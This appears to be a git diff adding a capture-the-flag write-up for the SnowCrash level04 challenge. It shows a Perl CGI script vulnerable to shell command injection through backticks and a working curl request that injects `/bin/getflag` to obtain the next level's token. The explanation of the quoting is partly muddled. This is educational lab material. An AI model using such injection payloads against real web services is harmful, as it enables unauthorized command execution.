@@ -367,3 +367,77 @@ level04@SnowCrash:~$
 The flag is the right one!
 
 </details>
+
+
+## level04
+
+<details>
+
+<summary>Explanations</summary>
+
+###
+
+This time we also get a file entitled ``level04.pl``. ``.pl`` means that this is a Perl file. When executing the Perl file, we get this:
+```bash
+level04@SnowCrash:~$ perl level04.pl 
+Content-type: text/html
+
+
+```
+
+And when we display what is infile the file, we get this:
+```bash
+level04@SnowCrash:~$ cat level04.pl 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+
+As we can see the CGI (Common Gateway Interface) is used. CGI scripts are useful [to write dynamic program for the Web](https://www.perl.com/article/perl-and-cgi/).
+
+To interact with these scripts, using Perl is not the only way. We can making a request to the right address. Here the address is given: ``localhost:4747``
+```bash
+level04@SnowCrash:~$ curl localhost:4747
+
+```
+
+But nothing happens.
+
+If we take a closer look at the code, we can see that the script actually take a param ``x`` and is supposed to display it. So let's try again a request but this time with a ``x`` param in our url:
+```bash
+level04@SnowCrash:~$ curl localhost:4747/?x=test
+test
+```
+
+This time it worked! And this is where we are going to attack.
+
+In Perl, we need to becareful when letting the possibility to put people's own params (https://perldoc.perl.org/perlsec)
+
+In our case, you can manipulate what we send to run our own command. How? By closing earlier ``echo``'s quotes!
+
+If I say that my ``x``'s value is something like `` `/bin/get/flag` ``, the ``print`` line will look like this ``print `echo `/bin/getflag` 2>&1`;``.
+
+``echo`` will stop instantly, to let our /bin/getflag command execute:
+```bash
+level04@SnowCrash:~$ curl 'localhost:4747/?x=`/bin/getflag`'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
+We just had to had ``'``, otherwise `` ` `` won't count (thanks to bash's parsing with quotes)
+
+But now we have our token! Let's see if the token is the right one:
+```bash
+level04@SnowCrash:~$ su level05
+Password: 
+level05@SnowCrash:~$ 
+```
+
+The token is indeed valid!
+
+</details>
